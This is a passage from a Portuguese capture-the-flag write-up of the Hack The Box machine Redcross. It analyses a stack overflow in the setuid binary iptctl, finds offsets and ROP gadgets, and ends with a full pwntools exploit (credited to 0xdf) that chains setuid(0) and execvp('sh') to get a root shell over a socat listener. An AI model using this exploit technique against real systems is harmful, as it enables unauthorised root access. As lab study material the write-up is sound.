        pid_t child_pid;
        char inputAction[10];
        char inputAddress[16];
        char *args[10];
        char buffer[200];

        if(argc!=3 && argc!=2){
                printf("Usage: %s allow|restrict|show IP_ADDR\n", argv[0]);
                exit(0);
        }
        if(argc==2){
                if(strstr(argv[1],"-i")) interactive(inputAddress, inputAction, argv[0]);
        }
        else{
                strcpy(inputAction, argv[1]);
                strcpy(inputAddress, argv[2]);
        }
        isAction=isValidAction(inputAction);
        isIPAddr=isValidIpAddress(inputAddress);
        if(!isAction || !isIPAddr){
                printf("Usage: %s allow|restrict|show IP\n", argv[0]);
                exit(0);
        }
        puts("DEBUG: All checks passed... Executing iptables");
        if(isAction==1) cmdAR(args,"-A",inputAddress);
        if(isAction==2) cmdAR(args,"-D",inputAddress);
        if(isAction==3) cmdShow(args);

        child_pid=fork();
        if(child_pid==0){
                setuid(0);
                execvp(args[0],args);
                exit(0);
        }
        else{
                if(isAction==1) printf("Network access granted to %s\n",inputAddress);
                if(isAction==2) printf("Network access restricted to %s\n",inputAddress);
                if(isAction==3) puts("ERR: Function not available!\n");
        }
}
```

O overflow está acontecendo mais especificamente na função `interactive`

```
#define BUFFSIZE 360

void interactive(char *ip, char *action, char *name){
        char inputAddress[16];
        char inputAction[10];
        printf("Entering interactive mode\n");
        printf("Action(allow|restrict|show): ");
        fgets(inputAction,BUFFSIZE,stdin);
        fflush(stdin);
        printf("IP address: ");
        fgets(inputAddress,BUFFSIZE,stdin);
        fflush(stdin);
        inputAddress[strlen(inputAddress)-1] = 0;
        if(! isValidAction(inputAction) || ! isValidIpAddress(inputAddress)){
                printf("Usage: %s allow|restrict|show IP\n", name);
                exit(0);
        }
        strcpy(ip, inputAddress);
        strcpy(action, inputAction);
        return;
}
```

O programa usa a chamada `fgets` para ler os 360 bytes, nos dois inputs, o `inputAction` e o `inputAddress`. Outro ponto que poderiamos explorar também é a função `strcpy` que também é vulnerável. Uma coisa que facilitou muito a exploração aqui é o fato do `fgets` ler qualquer tipo de dado, inclusive null, pq encontrar um exploit para 64 bits sem ter null, é realmente complicado

Todo tipo de informação que eu passar vai ser processado pelo `isValidAction` e pelo `isValidIpAddress`

```
int isValidIpAddress(char *ipAddress)
{
        struct sockaddr_in sa;
        int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
        return result != 0;
}

int isValidAction(char *action){
        int a=0;
        char value[10];
        strncpy(value,action,9);
        if(strstr(value,"allow")) a=1;
        if(strstr(value,"restrict")) a=2;
        if(strstr(value,"show")) a=3;
        return a;
}
```

O ip check não vamos conseguir fazer o buffer. O action vai ser mais tranquilo, uma vez que uma das três opções estão presentes nos primeiros 9 bytes da string. Então vamos fazer o overflow no parâmetro action

### Verificando defesas

Um coisa a se verificar é se o ASLR está habilitado nessa máquina

`cat /proc/sys/kernel/randomize_va_space`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof7.png)

Sim, está habilitado.

Abrimos o binário no `gdb` e damos o comando `checksec` para verificar quais proteções estão habilitadas no binário

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof8.png)

Verificamos que o `NX` está habilitado, o que indica que não podemos jogar diretamenteo shellcode na stack na aplicação para executar nosso exploit, mas pelo visto é apenas essa, então vou utilizar de uma técnica chamada ROP (Return Oriented Programming) para fazer a exploração desse binário e ganhar o aceso de root

### Encontrando o Offset

Primeiro passo devemos encontrar o offset, o ponto em que ocorre o buffer na aplicação, para isso vou gerar uma string com o gdb mesmo e jogar na aplicação

Com o `pattern create` criamos um offset de 50 caracteres

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof9.png)

Rodamos a aplicação e jogamos esse offset no campo Action

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof10.png)

O endereço que ficou gravadno no `RSP` foi 

`$rsp   : 0x00007fffffffde48  →  "aaaeaaaaaaafaaaaaaaga\n"`

Então agora verificamos qual é o ponto exato

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bog11.png)

Bom, descobrimos que o Offset é de 29 bytes, podemos provar isso, jogando uma string de 29 A's e 8 B's (Big Endian)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof12.png)

Ai está! Temos o controle da aplicação

### Como será feito o payload?

Agora o que é preciso é rodar um payload nesse RIP, pois é para onde o RSP está apontando. Em um host 32 bits, um simples ret2libc ou ret2self resolveria o problema. Vamos seguir a mesma ideia/estratégia, contudo por se tratar de um host 64bits temos que tomar algumas precauções

Primeira coisa, quando estamos em um sistema 64 bits, os parametros são passados de maneira diferente. Em 32bits, os argumentos são passados para a stack (pilha), então eu posso sobrescrever o ponto de retorno com a função que eu quero chamar, ai depois coloco um exit() e os próximos endereços que quero passar, em 64 bits, os argumentos são passados aos registradores, então para chamar um simples system("sh"), eu tenho que pegar o endereço ra string "sh" no registrador RDI.

Outro ponto importante a ser considerado é o fato do ASLR em sistemas 64 bits ocupar muito mais espaço na memória, ou seja, o intervalo de bytes que ela ocupa é muito maior

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof13.png)

Olhando no resultado do comando, a gente consegue ver um range de 28 bits. Então antes, em 32 bits a probabilidade de sucesso era (511 para 512)/1000 = 85%, neste caso, eu tenho muito mais, então é 1 em (268435455 para 268435456)/1000 = 0.0003%, quase impossível de conseguir acessar o endereço da memória, é quase um pra um milhão. Felizmente neste caso temos algo que nos facilita, o programa faz uma cchamada para `execvp` para executar um iptables, o que siginifica isso? Siginifica que temos uma entrada no PLT para isso, quenão mudar com o ASLR sendo alterado. `Execvp` é chamada como `int execvp(const char *file, char *const argv[]);`(isso de acordo com a man page dele). Então o que significa que tudo que eu preciso é pegar um "sh" na RDI e um caracter null no RSI.

Vamos lá então

### Pegando a ROP

Para pegar o endereço da rop chain, vamos utilizar o gdb mesmo

Depois de dar crash na aplicação, jogando o buffer nela, verificamos com o comando ROP quais sãos gadgets que podemos utilizar

```
0x0000000000400de3: pop rdi;ret;
0x0000000000400de1: pop rsi; pop r15;ret;
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof14.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof15.png)

Bom, creio que esses dois vão dar conta do serviço. Por primeiro eu quero colocar no topo da stack algo que eu controle, no caso o RDI e um return. O segundo será um pop através d RSI, então pop R15 e return.

O payload vai ser mais ou menos assim

`"allow" + "A"*29 + pop_rdi + sh_string + pop_rsi_r15 + null + anything + execvp_addr`

Com o return, eu vou ir para o topo da stack, onde está meu pop_rdi gadget. Agora o topo da stack vai se endereçado para a string /bin/sh, então o gadget pop_rsi vai rodar, vai encontrar o endereço dentro do RDI e dar o return. Quando ele retorna, o endereço do segundo gadget está no topo da stack. Retorno é executado, indo através do gadget, vai sair o value_for_rsi no topo. Depois de dois pops, dois mais valores que eu coloquei no RSI e R15, e então o endereço do execvp está no topo da stack quando outro return é alcançado. Ai é executado e me da um shell

### Pegando os valores

O primeiro que me interessa é o /bin/sh, então pesquisamos pela string na memória

> 0x7ffff7f6d1ac

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof16.png)

Pegando o valor do execvp (lembrar de reiniciar o gdb com a aplicação)

> p execvp

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof17.png)

Pegamos todos os valores da tabela `plt` também

> objdump -D -j .plt iptctl | grep \@plt

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof18.png)

```
00000000004006e0 <strncpy@plt>:
00000000004006f0 <strcpy@plt>:
0000000000400700 <puts@plt>:
0000000000400710 <strlen@plt>:
0000000000400720 <printf@plt>:
0000000000400730 <fgets@plt>:
0000000000400740 <inet_pton@plt>:
0000000000400750 <fflush@plt>:
0000000000400760 <execvp@plt>:
0000000000400770 <exit@plt>:
0000000000400780 <setuid@plt>:
0000000000400790 <fork@plt>:
00000000004007a0 <strstr@plt>:
```

### Fazendo a interação

Uma vez que a máquina não disponibiliza essa aplicação por nenhuma porta, eu vou dar um jeito de ela fazer isso

`socat TCP-LISTEN:9001 EXEC:"/opt/iptctl/iptctl -i"`

Isso vai fazer a máquina Redcross abrir a porta 9001 e disponibilizar o binário iptctl

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof19.png)

Agora executamos o payload final

### Explorando e ganhando shell de root

Copiei do 0xdf, não consegui desenvolver ele, quando tiver um conhecimento melhor de exploração de binários em sistemas 64bits retorno aqui

payload.py
```
#!/usr/bin/env python
# on redcross setup iptctl with socat listening on 9001
# socat TCP-LISTEN:9001 EXEC:"/opt/iptctl/iptctl -i"

from pwn import *


# addresses
execvp  = p64(0x400760) # execve plt
setuid  = p64(0x400780) # setuid plt
pop_rdi = p64(0x400de3) # pop rdi; ret
pop_rsi = p64(0x400de1) # pop rsi; pop r15; retd
sh_str  = p64(0x40046e) # "sh"

#setup payload
payload = "allow" +("A"*29)

# setuid(0)
payload += pop_rdi
payload += p64(0)
payload += setuid

#execvp("sh", 0)
payload += pop_rdi
payload += sh_str
payload += pop_rsi
payload += p64(0)
payload += p64(0)
payload += execvp

payload += "\n7.8.8.9\n"

log.info("Attempting to connect")
try:
    p = remote("10.10.10.113",9001)
except pwnlib.exception.PwnlibException:
    log.warn("Could not connect to target")
    log.warn('Is socat running on target?')
    log.warn('TCP-LISTEN:9001 EXEC:"/opt/iptctl/iptctl -i" running?')
    exit()
p.sendline(payload)
p.interactive()
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof20.png)

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_user.png)

Po pessoal, realmente desculpas pelo meu péssimo rendimento no buffer overflow, é algo que eu realmente necessido estudar mais!